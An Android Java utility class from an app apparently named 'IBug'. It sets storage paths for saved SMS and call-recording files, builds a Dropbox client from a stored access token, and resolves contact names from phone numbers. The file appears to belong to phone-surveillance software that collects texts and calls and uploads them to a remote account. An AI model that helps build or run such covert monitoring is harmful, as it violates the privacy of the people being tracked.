package com.ibug.misc;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.ibug.IAnnotations.*;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Locale;

public class Utils {

    public static final String Tag = "IBug";
    public static final String jsonType = ".qr";
    public static final String zipType = ".rqr";
    public static final String recType = ".amr";
    private static final String[] selectionArgs = null;
    private static final String[] projection = null;
    private static final String selection = null;
    private static final String sortOrder = null;

    public static File getRootStorage() {
        return Environment.getExternalStorageDirectory();
    }

    public static String smsLocation(Context c) {
        SharedPreferences pref = c.getSharedPreferences(Tag, Context.MODE_PRIVATE);
        String canonicalPath = pref.getString("sms", null);
        File smsPath = new File(getRootStorage(), canonicalPath);
        smsPath.mkdirs();
        return smsPath.getAbsolutePath();
    }

    public static String callLocation(Context c) {
        SharedPreferences pref = c.getSharedPreferences(Tag, Context.MODE_PRIVATE);
        String canonicalPath = pref.getString("calls", null);
        File callsPath = new File(getRootStorage(), canonicalPath);
        callsPath.mkdirs();
        return callsPath.getAbsolutePath();
    }

    @StartMethod
    public static String makeLocalSmsFile(Context c, String _filename, long id) {
        String filename = _filename + id + jsonType;
        File file = new File (smsLocation(c), filename);
        return file.getAbsolutePath( );
    }

    @StartMethod
    public static String makeLocalCallsFile(Context ctx, String _filename, long id) {
        String filename = _filename + id + zipType;
        File file = new File( callLocation(ctx), filename);
        return file.getAbsolutePath( );
    }

    public static String accessRoot(Context c) {
        SharedPreferences pref = c.getSharedPreferences(Tag, Context.MODE_PRIVATE);
        return pref.getString("accessRoot", null);
    }

    public static String accessToken(Context c) {
        SharedPreferences pref = c.getSharedPreferences(Tag, Context.MODE_PRIVATE);
        return pref.getString("accessToken", null);
    }

    @StartMethod
    public static void addToSharePreference(Context c, String key, String value) {
        SharedPreferences pref = c.getSharedPreferences(Tag, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = pref.edit();
        editor.putString( key, value );
        editor.apply( );
    }

    @StartMethod
    public static String appDateTimeFormat( long timeStamp ) {
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy 'at' HH:mm:ss", Locale.UK);
        return dateFormat.format( timeStamp );
    }

    @StartMethod
    public static DbxClientV2 getDbxClientV2(Context context ) {
        String remoteRoot = accessRoot(context);
        DbxRequestConfig dbxRequestConfig = DbxRequestConfig.newBuilder(remoteRoot).build();
        return new DbxClientV2( dbxRequestConfig, accessToken(context));
    }

    @StartMethod
    public static String contactName(Context context, String address) {
        String contactName = "No name";
        try {

            ContentResolver contentResolver = context.getContentResolver();
            String[] queryCollections = new String[]{ContactsContract.Data.DISPLAY_NAME};
            Uri uri = Uri.withAppendedPath( ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address) );
            Cursor cursor = contentResolver.query(uri, queryCollections, selection, selectionArgs, sortOrder );
            if( cursor.moveToFirst() ) contactName = cursor.getString(0 );

            cursor.close();

        } catch (Exception ex){ Log.d(Tag, ex.getMessage());}

        return contactName;
    }

}
